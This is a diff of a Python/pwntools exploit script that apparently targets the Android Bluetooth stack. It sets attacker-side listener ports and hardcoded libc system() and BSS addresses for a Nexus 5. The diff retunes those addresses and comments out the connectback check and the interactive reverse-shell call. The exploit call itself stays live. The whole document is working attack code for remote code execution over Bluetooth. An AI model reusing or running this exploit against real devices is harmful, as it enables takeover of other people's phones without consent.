@@ -13,6 +13,7 @@ import connectback
 
 from pwn import log
 
+#Not used
 
 # Listening TCP ports that need to be opened on the attacker machine
 NC_PORT = 1233
@@ -33,6 +34,9 @@ STDIN_PORT = 1235
 
 # Nexus 5 6.0.1
 #LIBC_TEXT_STSTEM_OFFSET = 0x1fff0+ 1 # system + 1
+
+#Not used
+
 LIBC_TEXT_STSTEM_OFFSET = 0x46b4d + 1
 LIBC_SOME_BLX_OFFSET = 0x9f9
 
@@ -258,25 +262,24 @@ def main(src_hci, dst, my_ip):
         bluetooth_default_bss_base =0xacd8f000
 
         system_addr = LIBC_TEXT_STSTEM_OFFSET + libc_text_base
-        system_addr =  0xb4fadb66 
+        system_addr =  0xb4fadb66+1 
         acl_name_addr = BSS_ACL_REMOTE_NAME_OFFSET + bluetooth_default_bss_base
-        acl_name_addr = 0x9afa34ec
+        acl_name_addr = 0xacfb34ec
         #assert acl_name_addr % 4 == 0
         log.info('system: 0x%08x, acl_name: 0x%08x' % (system_addr, acl_name_addr))
 
         pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base)
         # Check if we got a connectback
-        readable, _, _ = select.select([sh_s], [], [], PWNING_TIMEOUT)
-        if readable:
-            log.info('Done')
-            break
+        #readable, _, _ = select.select([sh_s], [], [], PWNING_TIMEOUT)
+        #if readable:
+        #    log.info('Done')
+        #    break
 
-    else:
-        assert False, "Pwning failed all attempts"
+        #else:
+        #assert False, "Pwning failed all attempts"
 
-    connectback.interactive_shell(sh_s, stdin, stdout, my_ip, STDIN_PORT, STDOUT_PORT)
+        #connectback.interactive_shell(sh_s, stdin, stdout, my_ip, STDIN_PORT, STDOUT_PORT)
 
 
 if __name__ == '__main__':
     main(*sys.argv[1:])
-
